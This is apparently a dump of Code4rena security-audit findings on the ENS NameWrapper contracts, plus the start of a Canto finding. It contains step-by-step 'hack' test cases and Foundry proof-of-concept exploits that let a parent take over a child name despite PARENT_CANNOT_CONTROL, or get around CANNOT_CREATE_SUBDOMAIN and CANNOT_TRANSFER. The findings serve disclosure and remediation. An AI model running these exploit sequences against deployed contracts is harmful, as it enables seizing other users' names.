NameWrapper.registerAndWrapETH2LD(\r         label1,\r         hacker,\r         10 * DAY,\r         EMPTY_ADDRESS,\r         CANNOT_UNWRAP\r       )\r       expect(await NameWrapper.ownerOf(wrappedTokenId1)).to.equal(hacker)\r \r       // step 2. create sub2.sub1.eth to hacker without fuses\r       await NameWrapperH.setSubnodeOwner(wrappedTokenId1, label2, hacker, 0, 0)\r       expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)\r \r       // step 3. create sub3.sub2.sub1.eth to hacker without fuses\r       await NameWrapperH.setSubnodeOwner(wrappedTokenId2, label3, hacker, 0, 0)\r       expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(hacker)\r \r       // step 4. unwrap sub2.sub1.eth\r       await NameWrapperH.unwrap(wrappedTokenId1, labelHash2, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)\r       \r       // step 5. set the EnsRegistry owner of sub3.sub2.sub1.eth as the hacker\r       await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)\r       \r       // step 6. re-wrap sub2.sub1.eth\r       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)\r       await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)\r       expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)\r \r       // step 7. set sub2.sub1.eth PARENT_CANNOT_CONTRL | CANNOT_UNWRAP\r       await NameWrapperH.setChildFuses(\r         wrappedTokenId1,\r         labelHash2, \r         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,\r         MAX_EXPIRY\r       )\r \r       // step 8. (in NameWrapper) set sub3.sub2.sub1.eth to a account2 and burn PARENT_CANNOT_CONTRL\r       await NameWrapperH.setSubnodeOwner(\r         wrappedTokenId2, \r         label3,\r         account2, \r         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,\r         MAX_EXPIRY\r       )\r \r       let [owner1, fuses1, ] = await NameWrapper.getData(wrappedTokenId3)\r       expect(owner1).to.equal(account2)\r       expect(fuses1).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)\r \r       // HACK: regain sub3.sub2.sub1.eth by wrap\r       await NameWrapperH.wrap(encodeName('sub3.sub2.sub1.eth'), hacker, EMPTY_ADDRESS)\r       let [owner2, fuses2, ] = await NameWrapper.getData(wrappedTokenId3)\r       expect(owner2).to.equal(hacker)\r       expect(fuses2).to.equal(PARENT_CANNOT_CONTROL)\r     })\r \r     it('reclaim ownership - hack 2', async () => {\r       // step 1. sub1.eth to hacker\r       await NameWrapper.registerAndWrapETH2LD(\r         label1,\r         hacker,\r         10 * DAY,\r         EMPTY_ADDRESS,\r         CANNOT_UNWRAP\r       )\r       expect(await NameWrapper.ownerOf(wrappedTokenId1)).to.equal(hacker)\r \r       // step 2. create sub2.sub1.eth to hacker without fuses\r       await NameWrapperH.setSubnodeOwner(wrappedTokenId1, label2, hacker, 0, 0)\r       expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)\r \r       // step 3. create sub3.sub2.sub1.eth to hacker without fuses\r       await NameWrapperH.setSubnodeOwner(wrappedTokenId2, label3, hacker, 0, 0)\r       expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(hacker)\r \r       // step 4. unwrap sub2.sub1.eth\r       await NameWrapperH.unwrap(wrappedTokenId1, labelHash2, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)\r       \r       // step 5. set the EnsRegistry owner of sub3.sub2.sub1.eth as the hacker\r       await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)\r       \r       // step 6. re-wrap sub2.sub1.eth\r       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)\r       await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)\r       expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)\r \r       // step 7. set sub2.sub1.eth PARENT_CANNOT_CONTRL | CANNOT_UNWRAP\r       await NameWrapperH.setChildFuses(\r         wrappedTokenId1,\r         labelHash2, \r         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,\r         MAX_EXPIRY\r       )\r \r       // step 8. (in NameWrapper) set sub3.sub2.sub1.eth to a account2 and burn PARENT_CANNOT_CONTRL\r       // by setChildFuse \r       await NameWrapperH.setChildFuses(\r         wrappedTokenId2, \r         labelHash3,\r         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,\r         MAX_EXPIRY\r       )\r \r       // step 9. safeTransferFrom to account2\r       await NameWrapperH.safeTransferFrom(hacker, account2, wrappedTokenId3, 1, \"0x\")\r \r       let [owner1, fuses1, ] = await NameWrapper.getData(wrappedTokenId3)\r       expect(owner1).to.equal(account2)\r       expect(fuses1).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)\r \r       // HACK: regain sub3.sub2.sub1.eth by wrap\r       await NameWrapperH.wrap(encodeName('sub3.sub2.sub1.eth'), hacker, EMPTY_ADDRESS)\r       let [owner2, fuses2, ] = await NameWrapper.getData(wrappedTokenId3)\r       expect(owner2).to.equal(hacker)\r       expect(fuses2).to.equal(PARENT_CANNOT_CONTROL)\r     })\r \r     it('reclaim ownership - hack 3', async () => {\r       // step 1. sub1.eth to hacker\r       await NameWrapper.registerAndWrapETH2LD(\r         label1,\r         hacker,\r         10 * DAY,\r         EMPTY_ADDRESS,\r         CANNOT_UNWRAP\r       )\r       expect(await NameWrapper.ownerOf(wrappedTokenId1)).to.equal(hacker)\r \r       // step 2. create sub2.sub1.eth to hacker without fuses\r       await NameWrapperH.setSubnodeOwner(wrappedTokenId1, label2, hacker, 0, 0)\r       expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)\r \r       // step 3. create sub3.sub2.sub1.eth to account2 without fuses\r       await NameWrapperH.setSubnodeOwner(wrappedTokenId2, label3, account2, 0, 0)\r       expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(account2)\r \r       // step 4. unwrap sub2.sub1.eth\r       await NameWrapperH.unwrap(wrappedTokenId1, labelHash2, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)\r       \r       // step 5. set the EnsRegistry owner of sub3.sub2.sub1.eth as the hacker\r       await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)\r       \r       // step 6. re-wrap sub2.sub1.eth\r       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)\r       await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)\r       expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)\r \r       // step 7. set sub2.sub1.eth PARENT_CANNOT_CONTRL | CANNOT_UNWRAP\r       await NameWrapperH.setChildFuses(\r         wrappedTokenId1,\r         labelHash2, \r         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,\r         MAX_EXPIRY\r       )\r \r       // step 8. (in NameWrapper) set sub3.sub2.sub1.eth to a account2 and burn PARENT_CANNOT_CONTRL\r       // by setChildFuses\r       await NameWrapperH.setChildFuses(\r         wrappedTokenId2, \r         labelHash3,\r         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,\r         MAX_EXPIRY\r       )\r \r       let [owner1, fuses1, ] = await NameWrapper.getData(wrappedTokenId3)\r       expect(owner1).to.equal(account2)\r       expect(fuses1).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)\r \r       // HACK: regain sub3.sub2.sub1.eth by wrap\r       await NameWrapperH.wrap(encodeName('sub3.sub2.sub1.eth'), hacker, EMPTY_ADDRESS)\r       let [owner2, fuses2, ] = await NameWrapper.getData(wrappedTokenId3)\r       expect(owner2).to.equal(hacker)\r       expect(fuses2).to.equal(PARENT_CANNOT_CONTROL)\r     })\r \r     it('violate CANNOT_CREATE_SUBDOMAIN - hack 1', async () => {\r       // step 1. sub1.eth to hacker\r       await NameWrapper.registerAndWrapETH2LD(\r         label1,\r         hacker,\r         10 * DAY,\r         EMPTY_ADDRESS,\r         CANNOT_UNWRAP\r       )\r       expect(await NameWrapper.ownerOf(wrappedTokenId1)).to.equal(hacker)\r \r       // step 2. create sub2.sub1.eth to hacker without fuses\r       await NameWrapperH.setSubnodeOwner(wrappedTokenId1, label2, hacker, 0, 0)\r       expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)\r \r       // step 3. create sub3.sub2.sub1.eth to hacker without fuses\r       await NameWrapperH.setSubnodeOwner(wrappedTokenId2, label3, hacker, 0, 0)\r       expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(hacker)\r \r       // step 4. unwrap sub2.sub1.eth\r       await NameWrapperH.unwrap(wrappedTokenId1, labelHash2, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)\r       \r       // step 5. set the EnsRegistry owner of sub3.sub2.sub1.eth as the hacker\r       await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)\r       \r       // step 6. re-wrap sub2.sub1.eth\r       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)\r       await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)\r       expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)\r \r       // step 7. set sub2.sub1.eth PARENT_CANNOT_CONTRL | CANNOT_UNWRAP\r       await NameWrapperH.setChildFuses(\r         wrappedTokenId1,\r         labelHash2, \r         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,\r         MAX_EXPIRY\r       )\r \r       // step 8. (in NameWrapper) set sub3.sub2.sub1.eth to a account2 and burn CANNOT_CREATE_SUBDOMAIN\r       await NameWrapperH.setSubnodeOwner(\r         wrappedTokenId2, \r         label3,\r         account2, \r         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN,\r         MAX_EXPIRY\r       )\r \r       let [owner1, fuses1, ] = await NameWrapper.getData(wrappedTokenId3)\r       expect(owner1).to.equal(account2)\r       expect(fuses1).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN)\r \r       // HACK: create sub4.ub3.sub2.sub1.eth \r       await EnsRegistryH.setSubnodeOwner(wrappedTokenId3, labelHash4, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId4)).to.equal(hacker)\r \r       await NameWrapperH.wrap(encodeName('sub4.sub3.sub2.sub1.eth'), hacker, EMPTY_ADDRESS)\r       let [owner2, fuses2, ] = await NameWrapper.getData(wrappedTokenId4)\r       expect(owner2).to.equal(hacker)\r       expect(fuses2).to.equal(CAN_DO_EVERYTHING)\r     })\r \r     it('violate CANNOT_CREATE_SUBDOMAIN - hack 2', async () => {\r       // step 1. sub1.eth to hacker\r       await NameWrapper.registerAndWrapETH2LD(\r         label1,\r         hacker,\r         10 * DAY,\r         EMPTY_ADDRESS,\r         CANNOT_UNWRAP\r       )\r       expect(await NameWrapper.ownerOf(wrappedTokenId1)).to.equal(hacker)\r \r       // step 2. create sub2.sub1.eth to hacker without fuses\r       await NameWrapperH.setSubnodeOwner(wrappedTokenId1, label2, hacker, 0, 0)\r       expect(await NameWrapper.ownerOf(wrappedTokenId2)).to.equal(hacker)\r \r       // step 3. create sub3.sub2.sub1.eth to hacker without fuses\r       await NameWrapperH.setSubnodeOwner(wrappedTokenId2, label3, hacker, 0, 0)\r       expect(await NameWrapper.ownerOf(wrappedTokenId3)).to.equal(hacker)\r \r       // step 4. unwrap sub2.sub1.eth\r       await NameWrapperH.unwrap(wrappedTokenId1, labelHash2, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId2)).to.equal(hacker)\r       \r       // step 5. set the EnsRegistry owner of sub3.sub2.sub1.eth as the hacker\r       await EnsRegistryH.setSubnodeOwner(wrappedTokenId2, labelHash3, hacker)\r       expect(await EnsRegistry.owner(wrappedTokenId3)).to.equal(hacker)\r       \r       // step 6. re-wrap sub2.sub1.eth\r       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)\r       await NameWrapperH.wrap(encodeName('sub2.sub1.eth'), hacker, EMPTY_ADDRESS)\r       ex"}, {"title": "NameWrapper: Wrapped to Unregistered to ignore `PARENT_CANNOT_CONTROL`", "html_url": "https://github.com/code-423n4/2022-11-ens-findings/issues/8", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "M-03"], "target": "2022-11-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L512 https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L550   # Vulnerability details  ## Impact  - owner of a wrapped node without `CANNOT_UNWRAP` fuse can unwrap and set the `ens.owner(node)` to zero to be an unregistered state - if it happens, even if the node has `PARENT_CANNOT_CONTROL` fuse, the parent of the node can change the `NameWrappwer.owner` of the node  ## Proof of Concept  Below is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.   In the proof of concept below, the parent node is `vitalik.eth` and the child node is `sub1.vitalik.eth`. The parent node has `PARENT_CANNOT_CONTROL`, `IS_DOT_ETH` and `CANNOT_UNWRAP` and the child node has `PARENT_CANNOT_CONTROL`.  The child node unwraps itself and set the owner on `ens` contract to the `address(0)` or `address(ens)`, which will make the child node to unregistered state even before expiry of the node.  Since technically the child node is unregistered, the parent can now 'create' the 'unregistered' node `sub1.vitalik.eth` by simply calling `setSubnodeRecord`. By doing so, the parent can take control over the child node, even though the `PARENT_CANNOT_CONTROL` fuse was set and it was before expiry.  ```solidity     function testM4WrappedToUnregistered() public {         string memory parent = 'vitalik.eth';         string memory sub1_full = 'sub1.vitalik.eth';         string memory sub1 = 'sub1';         (, bytes32 parent_node) = parent.dnsEncodeName();         (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();          // wrap parent and lock         vm.prank(user1);         registrar.setApprovalForAll(address(nameWrapper), true);         vm.prank(user1);         nameWrapper.wrapETH2LD('vitalik', user1, uint16(CANNOT_UNWRAP), address(0));         // checks         (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(parent_node));         assertEq(owner, user1);         assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP);         assertEq(expiry, 2038123728);          // subnode         vm.prank(user1);         nameWrapper.setSubnodeOwner(parent_node, 'sub1', user2, PARENT_CANNOT_CONTROL, 1700000000);         (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));         assertEq(owner, user2);         assertEq(fuses, PARENT_CANNOT_CONTROL);         assertEq(expiry, 1700000000);          // parent cannot set record on the sub1         vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub1_node));         vm.prank(user1);         nameWrapper.setSubnodeRecord(parent_node, sub1, user1, address(1), 10, 0, 0);          // parent: pcc cu         // child: pcc          // unwrap sub and set the ens owner to zero -> now parent can change owner         vm.prank(user2);         nameWrapper.unwrap(parent_node, _hashLabel(sub1), address(ens));         assertEq(ens.owner(sub1_node), address(0));          // sub node has PCC but parent can set owner, resolve and ttl         vm.prank(user1);         nameWrapper.setSubnodeRecord(parent_node, sub1, address(246), address(12345), 111111, 0, 0);         (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));         assertEq(owner, address(246));         assertEq(fuses, PARENT_CANNOT_CONTROL);         assertEq(expiry, 1700000000);         assertEq(ens.resolver(sub1_node), address(12345));         assertEq(ens.ttl(sub1_node), 111111);          // can change fuse as the new owner of sub1         vm.prank(address(246));         nameWrapper.setFuses(sub1_node, uint16(CANNOT_UNWRAP));         (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));         assertEq(owner, address(246));         assertEq(fuses, PARENT_CANNOT_CONTROL | CANNOT_UNWRAP);         assertEq(expiry, 1700000000);         assertEq(ens.resolver(sub1_node), address(12345));         assertEq(ens.ttl(sub1_node), 111111);     } ```  It is unlikely that the child node will set the owner of the ENS Registry to zero. But hypothetically, the owner of the child node wanted to \"burn\" the subnode thinking that no one can use it until the expiry. In that case the owner of the parent node can just take over the child node.   ## Tools Used  foundry  ## Recommended Mitigation Steps  Unclear, but consider using `ENS.recordExists` instead of checking the `ENS.owner`.   <!-- zzzitron M04 -->  "}, {"title": "NameWrapper: expired names behave unwrapped", "html_url": "https://github.com/code-423n4/2022-11-ens-findings/issues/7", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "M-02"], "target": "2022-11-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L512 https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L550   # Vulnerability details  ## Impact  - expired Names are supposed to be unregistered, but it behaves like unwrapped - parent with `CANNOT_CREATE_SUBDOMAIN` fuse can \"create\" again an expired name - parent can `ENS.setSubdomainOwner` before burning `CANNOT_CREATE_SUBDOMAIN` to be able to use the subdomain later   ## Proof of Concept  Below is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.  As in the `wrapper/README.md`:  > To check if a name is Unregistered, verify that `NameWrapper.ownerOf` returns `address(0)` and so does `Registry.owner`. > To check if a name is Unwrapped, verify that `NameWrapper.ownerOf` returns `address(0)` and `Registry.owner` does not.  Also, an expired name should go to Unregistered state per the graph suggests.   But, as the proof of concept below shows, after expiration, `NameWrapper.ownerOf(node)` is zero but `ens.owner(node)` is not zero. It is `Unwrapped` state based on the `wrapper/README.md`.   ```solidity     function testM3ExpiredNamesBehavesUnwrapped() public {         string memory str_node = 'vitalik.eth';         (bytes memory dnsName, bytes32 node) = str_node.dnsEncodeName();         // before wrapping the name check         assertEq(user1, ens.owner(node));         (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(node));         assertEq(owner, address(0));          // -- wrapETH2LD         vm.prank(user1);         registrar.setApprovalForAll(address(nameWrapper), true);         vm.prank(user1);         nameWrapper.wrapETH2LD('vitalik', user1, 0, address(0));         // after name wrap check         (owner, fuses, expiry) = nameWrapper.getData(uint256(node));         assertEq(owner, user1);         assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH);         assertEq(expiry, 2038123728);         // wrapETH2LD --          vm.warp(2038123729);         // after expiry         (owner, fuses, expiry) = nameWrapper.getData(uint256(node));         assertEq(owner, address(0));         assertEq(fuses, 0);         assertEq(expiry, 2038123728);         assertEq(nameWrapper.ownerOf(uint256(node)), address(0));         assertEq(ens.owner(node), address(nameWrapper)); // registry.owner is not zero         vm.expectRevert();         registrar.ownerOf(uint256(node));     } ```  Since an expired name is technically unwrapped, even a parent with `CANNOT_CREATE_SUBDOMAIN` can set the owner or records of the subdomain as the proof of concept below shows.  ```solidity     function testM3ExpiredNameCreate() public {         // After expired, the ens.owner's address is non-zero         // therefore, the parent can 'create' the name evne CANNOT_CREATE_SUBDOMAIN is burned         string memory parent = 'vitalik.eth';         string memory sub1_full = 'sub1.vitalik.eth';         string memory sub1 = 'sub1';         (, bytes32 parent_node) = parent.dnsEncodeName();         (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();          // wrap parent and lock         vm.prank(user1);         registrar.setApprovalForAll(address(nameWrapper), true);         vm.prank(user1);         nameWrapper.wrapETH2LD('vitalik', user1, uint16(CANNOT_UNWRAP), address(0));         // checks         (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(parent_node));         assertEq(owner, user1);         assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP);         assertEq(expiry, 2038123728);          // create subnode         vm.prank(user1);         nameWrapper.setSubnodeOwner(parent_node, 'sub1', user2, PARENT_CANNOT_CONTROL, 1700000000);         (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));         assertEq(owner, user2);         assertEq(fuses, PARENT_CANNOT_CONTROL);         assertEq(expiry, 1700000000);          // now parent cannot create subdomain         vm.prank(user1);         nameWrapper.setFuses(parent_node, uint16(CANNOT_CREATE_SUBDOMAIN));         (owner, fuses, expiry) = nameWrapper.getData(uint256(parent_node));         assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | CANNOT_UNWRAP | CANNOT_CREATE_SUBDOMAIN);         // parent: pcc cu CANNOT_CREATE_SUBDOMAIN         // child: pcc         // unwrap and sets the owner to zero          // parent cannot use setSubnodeRecord on PCCed sub         vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub1_node));         vm.prank(user1);         nameWrapper.setSubnodeRecord(parent_node, sub1, user1, address(1), 10, 0, 0);          // expire sub1         vm.warp(1700000001);         (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));         assertEq(owner, address(0));         assertEq(fuses, 0);         assertEq(expiry, 1700000000);         assertEq(ens.owner(sub1_node), address(nameWrapper));          // user1 can re-\"create\" sub1 even though CANNOT_CREATE_SUBDOMAIN is set on parent         vm.prank(user1);         nameWrapper.setSubnodeRecord(parent_node, sub1, address(3), address(11), 10, 0, 0);         (owner, fuses, expiry) = nameWrapper.getData(uint256(sub1_node));         assertEq(owner, address(3));         assertEq(fuses, 0);         assertEq(expiry, 1700000000);         assertEq(ens.owner(sub1_node), address(nameWrapper));          // comparison: tries create a new subdomain and revert         string memory sub2 = 'sub2';         string memory sub2_full = 'sub2.vitalik.eth';         (, bytes32 sub2_node) = sub2_full.dnsEncodeName();         vm.expectRevert(abi.encodeWithSelector(OperationProhibited.selector, sub2_node));         vm.prank(user1);         nameWrapper.setSubnodeRecord(parent_node, sub2, user2, address(11), 10, 0, 0);     } ```  ## Tools Used  foundry  ## Recommended Mitigation Steps  Unclear as the `NameWrapper` cannot set ENS.owner after expiration automatically.  <!-- zzzitron M03 -->  "}, {"title": "NameWrapper: Cannot prevent transfer while upgrade even with `CANNOT_TRANSFER` fuse regardless of the upgraded NameWrapper's implementation", "html_url": "https://github.com/code-423n4/2022-11-ens-findings/issues/6", "labels": ["bug", "2 (Med Risk)", "selected for report", "sponsor confirmed", "M-01"], "target": "2022-11-ens-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L408 https://github.com/code-423n4/2022-11-ens/blob/2b0491fee2944f5543e862b1e5d223c9a3701554/contracts/wrapper/NameWrapper.sol#L436   # Vulnerability details  ## Impact  Upon upgrade to a new `NameWrapper` contract, `owner` of the node will be set to the given `wrappedOwner`. Since the node will be `_burn`ed before calling the upgraded NameWrapper, the upgraded NameWrapper cannot check the old owner. Therefore, no matter the upgraded NameWrapper's implementation, it locks the information to check whether the old owner and newly given `wrappedOwner` are the same. If they are not the same, it means basically transferring the name to a new address.  In the case of resolver, the upgraded NameWrapper can check the old resolver by querying to the `ENS` registry, and prevent changing it if `CANNOT_SET_RESOLVER` fuse is burned.  ## Proof of Concept  Below is a snippet of the proof of concept. The whole code can be found in [this gist](https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol). And how to run test is in the comment in the gist.  The proof of concept below demonstrates upgrade process.    ```solidity // https://gist.github.com/zzzitron/7670730176e35d7b2322bc1f4b9737f0#file-2022-11-ens-versus-poc-t-sol-L215-L243     function testM2TransferWhileUpgrade() public {         // using the mock for upgrade contract         deployNameWrapperUpgrade();         string memory node_str = 'vitalik.eth';         string memory sub1_full = 'sub1.vitalik.eth';         string memory sub1_str = 'sub1';         (, bytes32 node) = node_str.dnsEncodeName();         (bytes memory sub1_dnsname, bytes32 sub1_node) = sub1_full.dnsEncodeName();          // wrap parent and lock         vm.prank(user1);         registrar.setApprovalForAll(address(nameWrapper), true);         vm.prank(user1);         nameWrapper.wrapETH2LD('vitalik', user1, type(uint16).max /* all fuses are burned */, address(0));         // sanity check         (address owner, uint32 fuses, uint64 expiry) = nameWrapper.getData(uint256(node));         assertEq(owner, user1);         assertEq(fuses, PARENT_CANNOT_CONTROL | IS_DOT_ETH | type(uint16).max);         assertEq(expiry, 2038123728);          // upgrade as nameWrapper's owner         vm.prank(root_owner);         nameWrapper.setUpgradeContract(nameWrapperUpgrade);         assertEq(address(nameWrapper.upgradeContract()), address(nameWrapperUpgrade));          // user1 calls upgradeETH2LD         vm.prank(user1);         nameWrapper.upgradeETH2LD('vitalik', address(123) /* new owner */, address(531) /* resolver */);     } ```  Even if the `CANNOT_TRANSFER` fuse is in effect, the user1 can call `upgradeETH2LD` with a new owner.   Before the `NameWrapper.upgradeETH2LD` calls the new upgraded NameWrapper `upgradeContract`, it calls `_prepareUpgrade`, which burns the node in question. It means, the current `NameWrapper.ownerOf(node)` will be zero.  The upgraded NameWrapper has only the given `wrappedOwner` which is supplied by the user, which does not guarantee to be the old owner (as the proof of concept above shows). As the ens registry and ETH registrar also do not have any information about the old owner, the upgraded NameWrapper should probably set the owner of the node to the given `wrappedOwner`, even if `CANNOT_TRANSFER` fuse is in effect.  On contrary to the owner, although `resolver` is given by the user on the `NameWrapper.upgradeETH2LD` function, it is possible to prevent changing it if the `CANNOT_SET_RESOLVER` fuse is burned, by querying to `ENSRegistry`.  ```solidity // NameWrapper   408     function upgradeETH2LD(  409         string calldata label,  410         address wrappedOwner,  411         address resolver  412     ) public {  413         bytes32 labelhash = keccak256(bytes(label));  414         bytes32 node = _makeNode(ETH_NODE, labelhash);  415         (uint32 fuses, uint64 expiry) = _prepareUpgrade(node);  416  417         upgradeContract.wrapETH2LD(  418             label,  419             wrappedOwner,  420             fuses,  421             expiry,  422             resolver  423         );  424     }   840     function _prepareUpgrade(bytes32 node)  841         private  842         returns (uint32 fuses, uint64 expiry)  843     {  844         if (address(upgradeContract) == address(0)) {  845             revert CannotUpgrade();  846         }  847  848         if (!canModifyName(node, msg.sender)) {  849             revert Unauthorised(node, msg.sender);  850         }  851  852         (, fuses, expiry) = getData(uint256(node));  853  854         _burn(uint256(node));  855     } ```   The function `NameWrapper.upgrade` has the same problem.  ```solidity // NameWrapper  436     function upgrade(  437         bytes32 parentNode,  438         string calldata label,  439         address wrappedOwner,  440         address resolver  441     ) public {  442         bytes32 labelhash = keccak256(bytes(label));  443         bytes32 node = _makeNode(parentNode, labelhash);  444         (uint32 fuses, uint64 expiry) = _prepareUpgrade(node);  445         upgradeContract.setSubnodeRecord(  446             parentNode,  447             label,  448             wrappedOwner,  449             resolver,  450             0,  451             fuses,  452             expiry  453         );  454     } ```    ## Tools Used  foundry  ## Recommended Mitigation Steps  If the `CANNOT_TRANSFER` fuse is set, enforce the `wrappedOwner` to be same as the `NameWrapper.ownerOf(node)`.  <!-- zzzitron M02 -->  "}, {"title": "`PostTxProcessing` can revert user transactions not interacting with Turnstile", "html_url": "https://github.com/code-423n4/2022-11-canto-findings/issues/94", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2022-11-canto-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L63 https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L75 https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L81 https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L88   # Vulnerability details  ## Impact Any transaction, even those that don't interact with the Turnstile contract, can be reverted by the `PostTxProcessing` hook if there was a CSR specific error. Thus, the CSR module can impair the behavior of smart contracts not related to the module. ## Proof of Concept The `PostTxProcessing` is used by the keeper to register contracts with the CSR module and distribute gas fees to registered contracts ([evm_hooks.go#L41](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L41)). The hook can return an error while handling CSR specific operations: - reading a CSR object from the storage ([evm_hooks.go#L61-L64](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L61-L64)); - sending gas fees to the module ([evm_hooks.go#L73-L76](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L73-L76)); - reading the address of Turnstile ([evm_hooks.go#L79-L82](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L79-L82)); - calling the `distributeFees` function ([evm_hooks.go#L85-L89](https://github.com/code-423n4/2022-11-canto/blob/2733fdd1bee73a6871c6243f92a007a0b80e4c61/Canto/x/csr/keeper/evm_hooks.go#L85-L89)).  In case any of these operations fails, the whole transaction will be reverted 